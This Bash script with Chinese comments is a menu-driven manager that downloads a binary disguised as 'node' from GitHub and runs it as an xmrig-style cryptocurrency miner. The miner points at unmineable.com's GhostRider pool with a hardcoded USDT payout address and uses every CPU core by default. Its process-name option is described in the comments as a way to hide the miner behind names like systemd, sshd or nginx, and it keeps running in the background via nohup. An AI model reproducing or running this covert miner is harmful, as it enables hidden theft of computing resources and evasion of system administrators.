#!/bin/bash

# ========================================
# 管理脚本 - CentOS Stream 9（node版）
# 功能：下载、启动、管理程序
# ========================================

# 定义颜色，让界面更美观
RED='\033[0;31m'      # 红色
GREEN='\033[0;32m'    # 绿色
YELLOW='\033[1;33m'   # 黄色
BLUE='\033[0;34m'     # 蓝色
CYAN='\033[0;36m'     # 青色
NC='\033[0m'          # 无颜色（重置）

# 默认配置
DEFAULT_WORKER_NAME="qiqi-10"
DEFAULT_CPU_THREADS=$(nproc)
DEFAULT_PROCESS_NAME="systemd"
MINER_DIR="/root/miner"
MINER_BINARY="node"
PID_FILE="/tmp/miner.pid"
LOG_FILE="/tmp/miner.log"

# ========================================
# 函数：显示主菜单
# 说明：这是程序的主界面，用户可以在这里选择要执行的操作
# ========================================
show_menu() {
    clear
    echo -e "${CYAN}========================================${NC}"
    echo -e "${CYAN}       管理工具 v1.0（node版）${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""
    echo -e "${GREEN}1.${NC} 下载程序"
    echo -e "${GREEN}2.${NC} 设置名称（当前：${YELLOW}${WORKER_NAME}${NC}）"
    echo -e "${GREEN}3.${NC} 设置CPU核心数（当前：${YELLOW}${CPU_THREADS}${NC}）"
    echo -e "${GREEN}4.${NC} 设置进程名（当前：${YELLOW}${PROCESS_NAME}${NC}）"
    echo -e "${GREEN}5.${NC} 启动程序（前台运行）"
    echo -e "${GREEN}6.${NC} 后台启动程序"
    echo -e "${GREEN}7.${NC} 查看运行状态"
    echo -e "${GREEN}8.${NC} 停止程序"
    echo -e "${GREEN}9.${NC} 查看日志"
    echo -e "${GREEN}0.${NC} 退出程序"
    echo ""
    echo -e "${CYAN}========================================${NC}"
    echo -n -e "${YELLOW}请选择操作 [0-9]: ${NC}"
}

# ========================================
# 函数：下载程序
# 说明：从GitHub下载node文件，不需要解压，直接给执行权限
# ========================================
download_miner() {
    clear
    echo -e "${CYAN}========================================${NC}"
    echo -e "${CYAN}       下载程序${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""
    
    # 提示用户输入下载地址
    echo -n "请输入下载地址（直接回车使用默认地址）: "
    read DOWNLOAD_URL
    
    # 如果用户没有输入，使用默认地址
    if [ -z "$DOWNLOAD_URL" ]; then
        DOWNLOAD_URL="https://raw.githubusercontent.com/qiqi258/1-wakuang/node/node"
        echo -e "${YELLOW}使用默认下载地址${NC}"
    fi
    
    # 创建安装目录
    echo -e "${BLUE}[1/3]${NC} 创建安装目录..."
    mkdir -p "$MINER_DIR"
    
    # 进入目录
    cd "$MINER_DIR" || {
        echo -e "${RED}错误：无法进入目录 $MINER_DIR${NC}"
        read -p "按回车键返回主菜单..."
        return 1
    }
    
    # 检查文件是否已存在
    if [ -f "$MINER_BINARY" ]; then
        echo -e "${YELLOW}文件已存在，是否重新下载？(y/n)${NC}"
        read -r RE_DOWNLOAD
        if [ "$RE_DOWNLOAD" != "y" ] && [ "$RE_DOWNLOAD" != "Y" ]; then
            echo -e "${YELLOW}跳过下载步骤${NC}"
        else
            rm -f "$MINER_BINARY"
        fi
    fi
    
    # 下载文件
    if [ ! -f "$MINER_BINARY" ]; then
        echo -e "${BLUE}[2/3]${NC} 正在下载: $DOWNLOAD_URL"
        echo -e "${YELLOW}这可能需要几分钟，请耐心等待...${NC}"
        
        # 使用wget下载，如果失败则尝试curl
        if command -v wget &> /dev/null; then
            wget --show-progress -O "$MINER_BINARY" "$DOWNLOAD_URL"
        elif command -v curl &> /dev/null; then
            curl -L -o "$MINER_BINARY" "$DOWNLOAD_URL"
        else
            echo -e "${RED}错误：系统没有安装 wget 或 curl${NC}"
            echo -e "${YELLOW}请先安装: dnf install -y wget${NC}"
            read -p "按回车键返回主菜单..."
            return 1
        fi
        
        # 检查下载是否成功
        if [ $? -ne 0 ]; then
            echo -e "${RED}错误：下载失败！${NC}"
            read -p "按回车键返回主菜单..."
            return 1
        fi
        
        echo -e "${GREEN}✓ 下载完成${NC}"
    fi
    
    # 给文件执行权限
    echo -e "${BLUE}[3/3]${NC} 设置文件权限..."
    chmod +x "$MINER_BINARY"
    echo -e "${GREEN}✓ 权限设置完成${NC}"
    
    echo ""
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}       安装完成！${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo -e "${YELLOW}安装目录：$MINER_DIR${NC}"
    echo -e "${YELLOW}可执行文件：$MINER_DIR/$MINER_BINARY${NC}"
    echo ""
    
    read -p "按回车键返回主菜单..."
}

# ========================================
# 函数：设置名称
# 说明：让用户输入名称，默认为qiqi-10
# ========================================
set_worker_name() {
    clear
    echo -e "${CYAN}========================================${NC}"
    echo -e "${CYAN}       设置名称${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""
    echo -e "${YELLOW}当前名称：${WORKER_NAME}${NC}"
    echo ""
    echo -n "请输入新的名称（直接回车保持不变）: "
    read NEW_NAME
    
    # 如果用户输入了新名称
    if [ -n "$NEW_NAME" ]; then
        WORKER_NAME="$NEW_NAME"
        # 保存到配置文件
        save_config
        echo -e "${GREEN}✓ 名称已更新为：${WORKER_NAME}${NC}"
    else
        echo -e "${YELLOW}名称保持不变${NC}"
    fi
    
    echo ""
    read -p "按回车键返回主菜单..."
}

# ========================================
# 函数：设置CPU核心数
# 说明：让用户选择使用的CPU核心数，默认为系统最大核心数
# ========================================
set_cpu_threads() {
    clear
    echo -e "${CYAN}========================================${NC}"
    echo -e "${CYAN}       设置CPU核心数${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""
    echo -e "${YELLOW}当前CPU核心数：${CPU_THREADS}${NC}"
    echo ""
    echo -e "${BLUE}系统CPU核心数：$(nproc)${NC}"
    echo ""
    echo -n "请输入要使用的CPU核心数（直接回车保持不变）: "
    read NEW_THREADS
    
    # 验证输入
    if [ -n "$NEW_THREADS" ]; then
        # 检查是否为数字
        if [[ "$NEW_THREADS" =~ ^[0-9]+$ ]]; then
            # 检查是否超过系统核心数
            if [ "$NEW_THREADS" -gt $(nproc) ]; then
                echo -e "${YELLOW}警告：输入的核心数超过系统核心数，已自动调整为最大值${NC}"
                CPU_THREADS=$(nproc)
            else
                CPU_THREADS="$NEW_THREADS"
            fi
            # 保存到配置文件
            save_config
            echo -e "${GREEN}✓ CPU核心数已更新为：${CPU_THREADS}${NC}"
        else
            echo -e "${RED}错误：请输入有效的数字${NC}"
        fi
    else
        echo -e "${YELLOW}CPU核心数保持不变${NC}"
    fi
    
    echo ""
    read -p "按回车键返回主菜单..."
}

# ========================================
# 函数：设置进程名
# 说明：让用户设置进程名称，用于隐藏xmrig进程名
# ========================================
set_process_name() {
    clear
    echo -e "${CYAN}========================================${NC}"
    echo -e "${CYAN}       设置进程名${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""
    echo -e "${YELLOW}当前进程名：${PROCESS_NAME}${NC}"
    echo ""
    echo -e "${BLUE}说明：设置进程名可以隐藏xmrig进程，让系统显示为其他名称${NC}"
    echo ""
    echo -e "${GREEN}请选择预设的进程名：${NC}"
    echo -e "${GREEN}1.${NC} systemd    - 系统服务管理器"
    echo -e "${GREEN}2.${NC} sshd       - SSH守护进程"
    echo -e "${GREEN}3.${NC} nginx      - Web服务器"
    echo -e "${GREEN}4.${NC} apache2    - Web服务器"
    echo -e "${GREEN}5.${NC} mysql      - 数据库服务"
    echo -e "${GREEN}6.${NC} postgres    - 数据库服务"
    echo -e "${GREEN}7.${NC} redis      - 缓存服务"
    echo -e "${GREEN}8.${NC} docker     - 容器服务"
    echo -e "${GREEN}9.${NC} cron       - 定时任务"
    echo -e "${GREEN}0.${NC} 自定义     - 手动输入进程名"
    echo ""
    echo -n -e "${YELLOW}请选择 [0-9]: ${NC}"
    read CHOICE
    
    case $CHOICE in
        1)
            PROCESS_NAME="systemd"
            ;;
        2)
            PROCESS_NAME="sshd"
            ;;
        3)
            PROCESS_NAME="nginx"
            ;;
        4)
            PROCESS_NAME="apache2"
            ;;
        5)
            PROCESS_NAME="mysql"
            ;;
        6)
            PROCESS_NAME="postgres"
            ;;
        7)
            PROCESS_NAME="redis"
            ;;
        8)
            PROCESS_NAME="docker"
            ;;
        9)
            PROCESS_NAME="cron"
            ;;
        0)
            echo ""
            echo -n "请输入自定义进程名（直接回车保持不变）: "
            read NEW_PROCESS_NAME
            
            # 如果用户输入了新名称
            if [ -n "$NEW_PROCESS_NAME" ]; then
                # 验证进程名（只允许字母、数字、下划线、连字符）
                if [[ "$NEW_PROCESS_NAME" =~ ^[a-zA-Z0-9_-]+$ ]]; then
                    PROCESS_NAME="$NEW_PROCESS_NAME"
                else
                    echo -e "${RED}错误：进程名只能包含字母、数字、下划线和连字符${NC}"
                    echo ""
                    read -p "按回车键返回主菜单..."
                    return 1
                fi
            else
                echo -e "${YELLOW}进程名保持不变${NC}"
                echo ""
                read -p "按回车键返回主菜单..."
                return 0
            fi
            ;;
        *)
            echo -e "${RED}无效的选择${NC}"
            echo ""
            read -p "按回车键返回主菜单..."
            return 1
            ;;
    esac
    
    # 保存到配置文件
    save_config
    echo -e "${GREEN}✓ 进程名已更新为：${PROCESS_NAME}${NC}"
    echo ""
    read -p "按回车键返回主菜单..."
}

# ========================================
# 函数：保存配置
# 说明：保存配置到文件
# ========================================
save_config() {
    echo "WORKER_NAME=$WORKER_NAME" > "$MINER_DIR/miner.conf"
    echo "CPU_THREADS=$CPU_THREADS" >> "$MINER_DIR/miner.conf"
    echo "PROCESS_NAME=$PROCESS_NAME" >> "$MINER_DIR/miner.conf"
}

# ========================================
# 函数：启动程序（前台运行）
# 说明：在前台启动程序，用户可以看到实时输出
# ========================================
start_miner() {
    clear
    echo -e "${CYAN}========================================${NC}"
    echo -e "${CYAN}       启动程序（前台运行）${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""
    
    # 检查程序是否存在
    if [ ! -f "$MINER_DIR/$MINER_BINARY" ]; then
        echo -e "${RED}错误：未找到程序！${NC}"
        echo -e "${YELLOW}请先执行选项1下载程序${NC}"
        read -p "按回车键返回主菜单..."
        return 1
    fi
    
    # 检查是否已经在运行
    if [ -f "$PID_FILE" ]; then
        PID=$(cat "$PID_FILE")
        if ps -p "$PID" > /dev/null 2>&1; then
            echo -e "${YELLOW}警告：程序已经在运行中（PID: $PID）${NC}"
            echo -n "是否要停止当前运行的程序并重新启动？(y/n): "
            read RESTART
            if [ "$RESTART" = "y" ] || [ "$RESTART" = "Y" ]; then
                stop_miner_silent
            else
                read -p "按回车键返回主菜单..."
                return 1
            fi
        fi
    fi
    
    echo -e "${BLUE}名称：${WORKER_NAME}${NC}"
    echo -e "${BLUE}CPU核心数：${CPU_THREADS}${NC}"
    echo -e "${BLUE}进程名：${PROCESS_NAME}${NC}"
    echo -e "${BLUE}启动命令：${NC}"
    echo -e "${YELLOW}cd $MINER_DIR && ./$MINER_BINARY --process-name=$PROCESS_NAME -t $CPU_THREADS -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u USDT:TDFRoYVFwze54ojydkiPUja8Twix9X5QRR.${WORKER_NAME}#ek8v-txze -p x${NC}"
    echo ""
    echo -e "${YELLOW}按 Ctrl+C 可以停止程序${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""
    
    # 启动程序
    cd "$MINER_DIR" || return 1
    ./$MINER_BINARY --process-name=$PROCESS_NAME -t $CPU_THREADS -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u "USDT:TDFRoYVFwze54ojydkiPUja8Twix9X5QRR.${WORKER_NAME}#ek8v-txze" -p x
    
    echo ""
    read -p "按回车键返回主菜单..."
}

# ========================================
# 函数：后台启动程序
# 说明：在后台启动程序，使用nohup让程序在关闭终端后继续运行
# ========================================
start_miner_background() {
    clear
    echo -e "${CYAN}========================================${NC}"
    echo -e "${CYAN}       后台启动程序${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""
    
    # 检查程序是否存在
    if [ ! -f "$MINER_DIR/$MINER_BINARY" ]; then
        echo -e "${RED}错误：未找到程序！${NC}"
        echo -e "${YELLOW}请先执行选项1下载程序${NC}"
        read -p "按回车键返回主菜单..."
        return 1
    fi
    
    # 检查是否已经在运行
    if [ -f "$PID_FILE" ]; then
        PID=$(cat "$PID_FILE")
        if ps -p "$PID" > /dev/null 2>&1; then
            echo -e "${YELLOW}警告：程序已经在运行中（PID: $PID）${NC}"
            echo -n "是否要停止当前运行的程序并重新启动？(y/n): "
            read RESTART
            if [ "$RESTART" = "y" ] || [ "$RESTART" = "Y" ]; then
                stop_miner_silent
            else
                read -p "按回车键返回主菜单..."
                return 1
            fi
        fi
    fi
    
    echo -e "${BLUE}正在后台启动程序...${NC}"
    
    # 使用nohup在后台启动，并将输出重定向到日志文件
    cd "$MINER_DIR" || return 1
    nohup ./$MINER_BINARY --process-name=$PROCESS_NAME -t $CPU_THREADS -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u "USDT:TDFRoYVFwze54ojydkiPUja8Twix9X5QRR.${WORKER_NAME}#ek8v-txze" -p x > "$LOG_FILE" 2>&1 &
    
    # 保存进程ID
    echo $! > "$PID_FILE"
    
    # 等待几秒检查是否启动成功
    sleep 3
    
    if ps -p $(cat "$PID_FILE") > /dev/null 2>&1; then
        echo -e "${GREEN}✓ 程序已成功在后台启动${NC}"
        echo -e "${YELLOW}进程ID：$(cat $PID_FILE)${NC}"
        echo -e "${YELLOW}日志文件：$LOG_FILE${NC}"
        echo ""
        echo -e "${CYAN}提示：${NC}"
        echo -e "  - 使用选项7查看运行状态"
        echo -e "  - 使用选项9查看日志"
        echo -e "  - 使用选项8停止程序"
    else
        echo -e "${RED}错误：程序启动失败！${NC}"
        echo -e "${YELLOW}请查看日志文件：$LOG_FILE${NC}"
        rm -f "$PID_FILE"
    fi
    
    echo ""
    read -p "按回车键返回主菜单..."
}

# ========================================
# 函数：查看运行状态
# 说明：检查程序是否在运行，显示进程信息和资源使用情况
# ========================================
check_status() {
    clear
    echo -e "${CYAN}========================================${NC}"
    echo -e "${CYAN}       查看运行状态${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""
    
    # 检查PID文件是否存在
    if [ ! -f "$PID_FILE" ]; then
        echo -e "${RED}未找到PID文件，程序可能未启动${NC}"
        echo ""
        read -p "按回车键返回主菜单..."
        return 1
    fi
    
    # 读取PID
    PID=$(cat "$PID_FILE")
    
    # 检查进程是否存在
    if ps -p "$PID" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ 程序正在运行${NC}"
        echo ""
        echo -e "${YELLOW}进程信息：${NC}"
        echo -e "  进程ID (PID): ${GREEN}$PID${NC}"
        echo -e "  名称: ${GREEN}$WORKER_NAME${NC}"
        echo -e "  CPU核心数: ${GREEN}$CPU_THREADS${NC}"
        echo -e "  进程名: ${GREEN}$PROCESS_NAME${NC}"
        echo -e "  安装目录: $MINER_DIR"
        echo -e "  日志文件: $LOG_FILE"
        echo ""
        echo -e "${YELLOW}资源使用情况：${NC}"
        ps -p "$PID" -o pid,ppid,%cpu,%mem,etime,cmd --no-headers | while read line; do
            echo -e "  $line"
        done
        echo ""
        echo -e "${YELLOW}最近10条日志：${NC}"
        if [ -f "$LOG_FILE" ]; then
            tail -n 10 "$LOG_FILE" | while read line; do
                echo -e "  $line"
            done
        else
            echo -e "  ${RED}日志文件不存在${NC}"
        fi
    else
        echo -e "${RED}✗ 程序未运行${NC}"
        echo -e "${YELLOW}PID文件存在但进程已停止${NC}"
        echo -e "${YELLOW}建议：删除PID文件后重新启动${NC}"
        rm -f "$PID_FILE"
    fi
    
    echo ""
    read -p "按回车键返回主菜单..."
}

# ========================================
# 函数：停止程序
# 说明：停止正在运行的程序进程
# ========================================
stop_miner() {
    clear
    echo -e "${CYAN}========================================${NC}"
    echo -e "${CYAN}       停止程序${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""
    
    # 检查PID文件是否存在
    if [ ! -f "$PID_FILE" ]; then
        echo -e "${YELLOW}未找到PID文件，程序可能未启动${NC}"
        echo ""
        read -p "按回车键返回主菜单..."
        return 1
    fi
    
    # 读取PID
    PID=$(cat "$PID_FILE")
    
    # 检查进程是否存在
    if ps -p "$PID" > /dev/null 2>&1; then
        echo -e "${YELLOW}正在停止程序（PID: $PID）...${NC}"
        
        # 尝试优雅停止
        kill "$PID"
        
        # 等待进程结束
        for i in {1..10}; do
            if ! ps -p "$PID" > /dev/null 2>&1; then
                echo -e "${GREEN}✓ 程序已成功停止${NC}"
                rm -f "$PID_FILE"
                echo ""
                read -p "按回车键返回主菜单..."
                return 0
            fi
            sleep 1
            echo -n "."
        done
        
        # 如果优雅停止失败，强制停止
        echo ""
        echo -e "${YELLOW}优雅停止失败，尝试强制停止...${NC}"
        kill -9 "$PID"
        sleep 1
        
        if ! ps -p "$PID" > /dev/null 2>&1; then
            echo -e "${GREEN}✓ 程序已强制停止${NC}"
            rm -f "$PID_FILE"
        else
            echo -e "${RED}错误：无法停止程序进程${NC}"
        fi
    else
        echo -e "${YELLOW}进程不存在，清理PID文件${NC}"
        rm -f "$PID_FILE"
    fi
    
    echo ""
    read -p "按回车键返回主菜单..."
}

# ========================================
# 函数：静默停止程序（内部使用）
# 说明：不显示任何信息，直接停止程序
# ========================================
stop_miner_silent() {
    if [ -f "$PID_FILE" ]; then
        PID=$(cat "$PID_FILE")
        if ps -p "$PID" > /dev/null 2>&1; then
            kill "$PID"
            sleep 2
            if ps -p "$PID" > /dev/null 2>&1; then
                kill -9 "$PID"
            fi
        fi
        rm -f "$PID_FILE"
    fi
}

# ========================================
# 函数：查看日志
# 说明：显示程序的运行日志
# ========================================
view_logs() {
    clear
    echo -e "${CYAN}========================================${NC}"
    echo -e "${CYAN}       查看日志${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""
    
    if [ ! -f "$LOG_FILE" ]; then
        echo -e "${RED}日志文件不存在：$LOG_FILE${NC}"
        echo -e "${YELLOW}程序可能还未启动过${NC}"
        echo ""
        read -p "按回车键返回主菜单..."
        return 1
    fi
    
    echo -e "${YELLOW}日志文件：$LOG_FILE${NC}"
    echo -e "${YELLOW}显示最后50行日志：${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""
    
    tail -n 50 "$LOG_FILE"
    
    echo ""
    echo -e "${CYAN}========================================${NC}"
    echo -e "${YELLOW}提示：${NC}"
    echo -e "  - 使用 'tail -f $LOG_FILE' 实时查看日志"
    echo -e "  - 使用 'cat $LOG_FILE' 查看完整日志"
    echo ""
    
    read -p "按回车键返回主菜单..."
}

# ========================================
# 主程序
# 说明：程序入口，加载配置并显示菜单
# ========================================

# 加载配置文件
if [ -f "$MINER_DIR/miner.conf" ]; then
    source "$MINER_DIR/miner.conf"
else
    WORKER_NAME="$DEFAULT_WORKER_NAME"
    CPU_THREADS="$DEFAULT_CPU_THREADS"
    PROCESS_NAME="$DEFAULT_PROCESS_NAME"
fi

# 主循环
while true; do
    show_menu
    read -r CHOICE
    
    case $CHOICE in
        1)
            download_miner
            ;;
        2)
            set_worker_name
            ;;
        3)
            set_cpu_threads
            ;;
        4)
            set_process_name
            ;;
        5)
            start_miner
            ;;
        6)
            start_miner_background
            ;;
        7)
            check_status
            ;;
        8)
            stop_miner
            ;;
        9)
            view_logs
            ;;
        0)
            clear
            echo -e "${GREEN}感谢使用管理工具，再见！${NC}"
            echo ""
            exit 0
            ;;
        *)
            echo -e "${RED}无效的选择，请重新输入${NC}"
            sleep 1
            ;;
    esac
done
